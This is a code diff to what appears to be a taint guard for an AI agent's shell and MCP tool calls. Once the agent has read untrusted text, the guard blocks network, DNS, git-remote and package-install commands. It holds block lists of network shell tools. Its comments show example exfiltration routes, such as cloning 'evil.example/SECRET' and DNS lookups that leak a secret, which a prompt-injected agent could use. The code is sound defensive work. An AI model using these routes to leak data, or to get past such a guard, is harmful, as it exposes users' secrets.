@@ -32,6 +32,30 @@ const GH_API_WRITE = /^(--method|--field|--raw-field|--input|--hostname)(=|$)|^-
 const GH_MERGE_UNSAFE = /^--(admin|body|body-file|subject|author-email)(=|$)|^-[^-]*[bFtA]|^(?!https:\/\/github\.com\/).*:\/\//
 // Settings that point gh at another host, wherever the line sets them (VAR=x prefix, env, $env:).
 const GH_OTHER_HOST = /GH_HOST|ENTERPRISE_TOKEN/i
+const GH = bin('gh')
+
+// A gh call's group and verb by position, so an option's value (--template list) cannot stand in for a verb.
+const ghVerbs = (args: readonly string[]) => {
+  const at = /^(-R|--repo)$/.test(args[0] ?? '') ? 2 : /^--repo=/.test(args[0] ?? '') ? 1 : 0
+
+  return args.slice(at)
+}
+
+// gh reads that return text third parties write (issue and PR bodies and comments, diffs, run logs, any API result): they taint like curl.
+const isGhUntrusted = (args: readonly string[]) => {
+  const [group, verb] = ghVerbs(args)
+
+  return group === 'api' || /^(view|diff)$/.test(verb ?? '')
+}
+
+// A URL, an scp-style host (git@host:path, or host.example:path with no user) or a remote helper (ext::): a host the call reaches, and data can ride in the address.
+// The bare form needs a dot or localhost in the host, so a drive (C:\x) or a refspec (main:main) is not one.
+const REMOTE = /:\/\/|::|^[^\s/\\:@]+@[^\s/\\:]+:|^([^\s/\\:@]+\.[^\s/\\:@]+|localhost):/
+// An image or module named by its host (evil.example/x, localhost:5000/x): docker and go fetch from that host.
+const HOSTED = /^([\w-]+(\.[\w-]+)+|localhost)(:\d+)?\//
+// Settings that point an installer at another index, registry, proxy or daemon, wherever the line sets them.
+const INSTALL_HOST = /PIP_(EXTRA_)?INDEX_URL|PIP_FIND_LINKS|UV_(EXTRA_|DEFAULT_)?INDEX|NPM_CONFIG_REGISTRY|GOPROXY|DOCKER_HOST/i
+const GIT_VALUE = /^(-C|-c|--git-dir|--work-tree|--namespace)$/
 
 // An MCP tool whose action only reads, by name: on a server TAINT_GUARD_READ_SERVERS names, it still taints but is not a sink.
 // shortcut: by tool name, and the call's arguments still reach that server; list only servers whose operator is not an attacker (first-party connectors, the app's own tools).
@@ -48,18 +72,45 @@ const SINKS: readonly (readonly [string, RegExp, (args: readonly string[], comma
     bin('curl|wget|nc|ncat|netcat|socat|telnet|ssh|scp|sftp|rsync|ftp|Invoke-WebRequest|iwr|Invoke-RestMethod|irm|Send-MailMessage|Start-BitsTransfer|bitsadmin'),
     args => !isAbout(args),
   ],
+  // A lookup sends the name it asks for to the attacker's DNS server (SECRET.evil.example), so it is a sink like curl.
+  [
+    'a DNS or ping tool',
+    bin('nslookup|dig|host|drill|ping|ping6|tracert|traceroute|tracepath|pathping|mtr|Resolve-DnsName|Test-NetConnection|tnc|Test-Connection'),
+    args => !isAbout(args),
+  ],
   // certutil hashes and decodes files locally; only its URL options fetch.
   ['a network tool', bin('certutil'), args => args.some(arg => /urlcache|verifyctl|^-ping|https?:/i.test(arg))],
   // shortcut: az and gcloud are refused whole, upgrade to a read list like aws's if they are used in tainted sessions.
   ['az or gcloud', bin('az|gcloud'), () => true],
-  ['git push', bin('git'), args => /^(push|send-email|request-pull)$/.test(first(args, /^(-C|-c|--git-dir|--work-tree|--namespace)$/))],
+  ['git push', bin('git'), args => /^(push|send-email|request-pull)$/.test(first(args, GIT_VALUE))],
+  // The URL itself carries data (git clone https://evil.example/SECRET), whatever the call does with it.
+  // Plain git fetch and pull stay allowed: they reach only the remotes already in the repo's config, which the model did not pick from a page.
+  [
+    'a git call to another host',
+    bin('git'),
+    args => /^(clone|fetch|pull|ls-remote|remote|submodule|config|archive)$/.test(first(args, GIT_VALUE)) && args.some(arg => REMOTE.test(arg)),
+  ],
+  // An install from a URL, or with its index or registry pointed elsewhere, asks that host for the address.
+  // python and npx are here too: python -m pip, and a script or package run straight from a URL.
+  [
+    'an install from another host',
+    bin('pip|pip3|pipx|uv|python|python3|py|npm|pnpm|yarn|bun|npx|bunx'),
+    (args, command) => INSTALL_HOST.test(command) || args.some(arg => REMOTE.test(arg)),
+  ],
+  // go and docker name a host in the module or image path itself; an unqualified image comes from Docker Hub.
+  [
+    'an install from another host',
+    bin('go|docker|podman'),
+    (args, command) =>
+      INSTALL_HOST.test(command) ||
+      args.some(arg => REMOTE.test(arg)) ||
+      (anyOf(/^(get|install|run|pull|create)$/)(args) && args.some(arg => HOSTED.test(arg))),
+  ],
   [
     'a gh call that writes',
-    bin('gh'),
+    GH,
     (args, command) => {
-      // The group and verb by position, so an option's value (--template list) cannot stand in for a read verb.
-      const at = /^(-R|--repo)$/.test(args[0] ?? '') ? 2 : /^--repo=/.test(args[0] ?? '') ? 1 : 0
-      const [group, verb] = args.slice(at)
+      const [group, verb] = ghVerbs(args)
 
       const isApiGet = group === 'api' && !GH_OTHER_HOST.test(command) && !args.some(arg => GH_API_WRITE.test(arg))
 
@@ -224,7 +275,10 @@ const reads = (e: { tool: string; [key: string]: unknown }, isTrusted: boolean):
     return e.tool
   }
 
-  if ((e.tool === 'Bash' || e.tool === 'PowerShell') && invocations(String(e.command), FETCH).some(args => !isAbout(args))) {
+  if (
+    (e.tool === 'Bash' || e.tool === 'PowerShell') &&
+    (invocations(String(e.command), FETCH).some(args => !isAbout(args)) || invocations(String(e.command), GH).some(isGhUntrusted))
+  ) {
     return `${e.tool} ${String(e.command).slice(0, 80)}`
   }
 
